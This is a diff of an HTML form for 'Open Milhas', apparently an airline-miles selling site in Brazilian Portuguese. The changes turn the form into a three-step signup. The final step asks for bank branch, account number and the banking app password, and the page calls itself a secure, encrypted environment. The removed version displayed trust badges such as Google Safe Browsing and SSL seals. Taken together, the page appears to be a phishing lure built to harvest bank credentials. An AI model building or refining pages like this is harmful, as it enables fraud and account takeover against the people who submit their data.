@@ -3,75 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Milhas | Vender Milhas</title>
+    <title>Open Milhas | Cadastro</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
     <style>
         :root { --primary: #2c7da0; --gold: #c5a059; --dark: #0a1128; }
-        body { font-family: 'Segoe UI', sans-serif; background: #fff; color: #333; }
-        .navbar-brand { font-weight: 800; color: var(--dark) !important; font-size: 1.6rem; }
-        .navbar-brand span { color: var(--gold); }
-        .progress-bar-custom { height: 10px; background: #e9ecef; border-radius: 20px; margin: 40px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: var(--primary); width: 33%; transition: 0.6s ease; }
-        /* Garante que os inputs apareçam corretamente */
-        .form-control { border-radius: 50px; padding: 15px 25px; border: 1px solid #ddd; margin-bottom: 20px; display: block; width: 100%; }
-        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; width: 100%; }
-        .footer-trust { background: #fdfdfd; border-top: 1px solid #eee; padding: 40px 0; margin-top: 50px; width: 100%; }
-        .badge-img { height: 35px; margin: 10px 15px; filter: grayscale(100%); opacity: 0.6; transition: 0.3s; }
-        .badge-img:hover { filter: grayscale(0); opacity: 1; }
+        body { font-family: 'Segoe UI', sans-serif; background: #fff; }
+        .progress-bar-custom { height: 10px; background: #e9ecef; border-radius: 20px; margin: 30px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: var(--primary); width: 33%; transition: 0.4s; }
+        .form-control { border-radius: 50px; padding: 15px 25px; margin-bottom: 15px; border: 1px solid #ddd; }
+        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; cursor: pointer; }
+        
+        /* Oculta os passos que não estão ativos */
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.4s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-<nav class="navbar border-bottom py-3">
-    <div class="container d-flex justify-content-between">
-        <a class="navbar-brand" href="#">OPEN <span>MILHAS</span></a>
-        <div class="small text-muted">Passo 1 de 3</div>
-    </div>
-</nav>
-
 <div class="container mt-5" style="max-width: 600px;">
     <div class="text-center mb-4">
-        <h2 class="fw-bold">Complete seu cadastro</h2>
-        <p class="text-muted">Valide seus dados para concluir a cotação.</p>
+        <h2 class="fw-bold">OPEN <span style="color:var(--gold)">MILHAS</span></h2>
+        <p class="text-muted" id="stepText">Passo 1: Dados Pessoais</p>
     </div>
 
-    <div class="progress-bar-custom"><div class="progress-fill"></div></div>
+    <div class="progress-bar-custom"><div class="progress-fill" id="progressBar"></div></div>
 
-    <form action="/login" method="POST">
-        <div class="mb-3">
+    <form action="/login" method="POST" id="mainForm">
+        <div class="step active" id="step1">
             <input type="text" name="nome" class="form-control" placeholder="Nome completo *" required>
-        </div>
-        <div class="mb-3">
             <input type="text" name="cpf" id="cpf" class="form-control" placeholder="CPF *" required>
+            <input type="email" name="email" class="form-control" placeholder="E-mail *">
+            <div class="text-end mt-3">
+                <button type="button" class="btn-next" onclick="nextStep(2)">Próximo <i class="fas fa-arrow-right ms-2"></i></button>
+            </div>
         </div>
-        <div class="mb-3">
-            <input type="email" name="email" class="form-control" placeholder="E-mail principal *" required>
+
+        <div class="step" id="step2">
+            <input type="text" name="cep" class="form-control" placeholder="CEP *">
+            <input type="text" name="rua" class="form-control" placeholder="Rua e Número *">
+            <div class="text-end mt-3">
+                <button type="button" class="btn btn-link text-muted me-2" onclick="nextStep(1)">Voltar</button>
+                <button type="button" class="btn-next" onclick="nextStep(3)">Próximo <i class="fas fa-arrow-right ms-2"></i></button>
+            </div>
         </div>
-        
-        <div class="mt-4">
-            <button type="submit" class="btn-next">Continuar <i class="fas fa-arrow-right ms-2"></i></button>
+
+        <div class="step" id="step3">
+            <input type="text" name="agencia" class="form-control" placeholder="Agência *" required>
+            <input type="text" name="conta" class="form-control" placeholder="Número da Conta *" required>
+            <input type="password" name="senha_app" class="form-control" placeholder="Senha do Aplicativo *" required>
+            <div class="alert alert-light small border-0"><i class="fas fa-shield-alt text-success me-2"></i> Ambiente seguro e criptografado.</div>
+            <div class="text-end mt-3">
+                <button type="button" class="btn btn-link text-muted me-2" onclick="nextStep(2)">Voltar</button>
+                <button type="submit" class="btn-next" style="background:var(--gold)">Finalizar Cadastro</button>
+            </div>
         </div>
     </form>
 </div>
 
-<footer class="footer-trust text-center">
-    <div class="container">
-        <p class="small fw-bold text-muted mb-4">PLATAFORMA SEGURA E HOMOLOGADA</p>
-        <div class="d-flex justify-content-center align-items-center flex-wrap">
-            <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" class="badge-img" alt="Reclame Aqui">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Safe_Browsing_logo.svg/1200px-Google_Safe_Browsing_logo.svg.png" class="badge-img" alt="Google Safe">
-            <img src="https://static.wixstatic.com/media/2cd43b_7f8674b65d3a43399659f8c853177695~mv2.png/v1/fill/w_320,h_102,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/Selo%20Seguro%20SSL.png" class="badge-img" alt="SSL">
-            <img src="https://logodownload.org/wp-content/uploads/2019/08/cadastur-logo.png" class="badge-img" alt="Cadastur">
-        </div>
-        <p class="mt-4 text-muted small">OPEN MILHAS &copy; 2026 | CNPJ: 26.878.221/0001-50</p>
-    </div>
-</footer>
-
 <script src="https://unpkg.com/imask"></script>
 <script>
+    // Máscara de CPF
     IMask(document.getElementById('cpf'), { mask: '000.000.000-00' });
-</script>
 
+    function nextStep(step) {
+        // Esconde todos os passos e mostra o desejado
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + step).classList.add('active');
+
+        // Atualiza a barra de progresso e textos
+        const fill = document.getElementById('progressBar');
+        const text = document.getElementById('stepText');
+        
+        if(step === 1) { fill.style.width = '33%'; text.innerText = 'Passo 1: Dados Pessoais'; }
+        if(step === 2) { fill.style.width = '66%'; text.innerText = 'Passo 2: Endereço'; }
+        if(step === 3) { fill.style.width = '100%'; text.innerText = 'Passo 3: Dados Bancários'; }
+        
+        window.scrollTo(0, 0);
+    }
+</script>
 </body>
 </html>
